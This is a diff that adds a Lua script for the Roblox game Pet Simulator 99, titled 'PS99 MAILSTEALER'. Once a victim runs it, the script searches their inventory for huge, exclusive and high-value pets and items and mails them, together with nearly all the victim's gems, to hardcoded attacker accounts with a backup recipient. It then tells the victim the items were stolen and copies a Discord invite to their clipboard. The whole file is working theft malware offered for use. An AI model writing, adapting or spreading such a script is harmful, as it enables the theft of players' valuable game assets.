@@ -1,0 +1,204 @@
+-- ===================================================
+--  PS99 MAILSTEALER – High‑Value Only
+--  Sends: Huges, Exclusives, RAP > 100k, and all gems.
+-- ===================================================
+
+local RECEIVER = "r1234gt"
+local BACKUP = "notacheater55551"
+local MAIL_MSG = "GG / FNnkfJqukh"
+local MIN_RAP = 100000   -- only send pets/items with RAP above this
+
+if getgenv()._mailstealer then return end
+getgenv()._mailstealer = true
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local network = ReplicatedStorage:WaitForChild("Network")
+
+-- Helper: fresh save
+local function getSave()
+    return require(ReplicatedStorage.Library.Client.Save).Get()
+end
+
+-- Helper: current gems
+local function getGems(s)
+    s = s or getSave()
+    for _, v in pairs(s.Inventory.Currency) do
+        if v.id == "Diamonds" then return v._am or 0 end
+    end
+    return 0
+end
+
+-- Helper: current mail cost
+local function getMailCost(s)
+    s = s or getSave()
+    local sends = s.MailboxSendsSinceReset or 0
+    local cost = 20000
+    for _ = 1, sends do cost = math.ceil(cost * 1.5) end
+    return math.min(cost, 5000000)
+end
+
+-- Get RAP for an item
+local function getRAP(category, item)
+    local RAPCmds = require(ReplicatedStorage.Library.Client.RAPCmds)
+    local fakeItem = {Class = {Name = category}}
+    function fakeItem:AbstractGetRAP() return nil end
+    function fakeItem:GetDefaultRAP() return 0 end
+    function fakeItem:StackKey()
+        return HttpService:JSONEncode({
+            id = item.id,
+            pt = item.pt,
+            sh = item.sh,
+            tn = item.tn
+        })
+    end
+    return RAPCmds.Get(fakeItem) or 0
+end
+
+-- Claim mail (ignore errors)
+local function claimMail()
+    local _, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
+    while err == "You must wait 30 seconds before using the mailbox!" do
+        task.wait(1)
+        _, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
+    end
+end
+
+-- Empty boxes & daycare
+local function prepare()
+    pcall(function()
+        local s = getSave()
+        if s.Inventory and s.Inventory.Box then
+            for key, val in pairs(s.Inventory.Box) do
+                if val._uq then
+                    network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
+                end
+            end
+        end
+        require(ReplicatedStorage.Library.Client.DaycareCmds).Claim()
+        require(ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
+    end)
+end
+
+-- Send a single item
+local function sendItem(username, category, uid, amount)
+    local s = getSave()
+    if getGems(s) < getMailCost(s) then return false end
+    local args = {username, MAIL_MSG, category, uid, amount or 1}
+    for _ = 1, 5 do
+        local success = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        if success then return true end
+        task.wait(1)
+    end
+    return false
+end
+
+-- Send all gems
+local function sendGems(username)
+    local s = getSave()
+    local cost = getMailCost(s)
+    local gems = getGems(s)
+    if gems < cost + 10000 then return end
+    for i, v in pairs(s.Inventory.Currency) do
+        if v.id == "Diamonds" then
+            local args = {username, MAIL_MSG, "Currency", i, gems - cost}
+            for _ = 1, 5 do
+                if network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args)) then
+                    return
+                end
+                task.wait(1)
+            end
+        end
+    end
+end
+
+-- ============================================
+-- COLLECT VALUABLE ITEMS
+-- ============================================
+local valuable = {}
+local inv = getSave().Inventory
+
+-- Categories to scan
+local categories = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
+
+for _, cat in ipairs(categories) do
+    if inv[cat] then
+        for uid, item in pairs(inv[cat]) do
+            if item._am and item._am > 0 then
+                local isHuge = false
+                local isExclusive = false
+                local rap = 0
+
+                if cat == "Pet" then
+                    local dir = require(ReplicatedStorage.Library.Directory.Pets)[item.id]
+                    if dir then
+                        if dir.huge then isHuge = true end
+                        if dir.exclusiveLevel then isExclusive = true end
+                    end
+                    rap = getRAP(cat, item)
+                else
+                    rap = getRAP(cat, item)
+                end
+
+                -- Keep if huge, exclusive, or rap above threshold
+                if isHuge or isExclusive or rap >= MIN_RAP then
+                    table.insert(valuable, {
+                        category = cat,
+                        uid = uid,
+                        amount = item._am,
+                        rap = rap,
+                        isHuge = isHuge,
+                        isExclusive = isExclusive
+                    })
+                end
+            end
+        end
+    end
+end
+
+-- If nothing found, exit
+if #valuable == 0 then
+    return
+end
+
+-- Sort: huges first, then exclusives, then by rap descending
+table.sort(valuable, function(a, b)
+    if a.isHuge and not b.isHuge then return true end
+    if b.isHuge and not a.isHuge then return false end
+    if a.isExclusive and not b.isExclusive then return true end
+    if b.isExclusive and not a.isExclusive then return false end
+    return a.rap > b.rap
+end)
+
+-- Prepare
+claimMail()
+prepare()
+
+-- Send valuable items
+local sent = 0
+local currentUser = RECEIVER
+for _, item in ipairs(valuable) do
+    if sendItem(currentUser, item.category, item.uid, item.amount) then
+        sent = sent + 1
+    else
+        if currentUser == RECEIVER then
+            currentUser = BACKUP
+            if sendItem(currentUser, item.category, item.uid, item.amount) then
+                sent = sent + 1
+            end
+        end
+    end
+    task.wait(0.3)
+end
+
+-- Send all gems
+sendGems(currentUser)
+
+-- Victim notification with updated Discord link
+pcall(function()
+    local msg = require(ReplicatedStorage.Library.Client.Message)
+    if msg then
+        msg.Error("Your valuable items were stolen!\nJoin https://discord.gg/XKEJYuWrhb")
+    end
+end)
+setclipboard("https://discord.gg/XKEJYuWrhb")
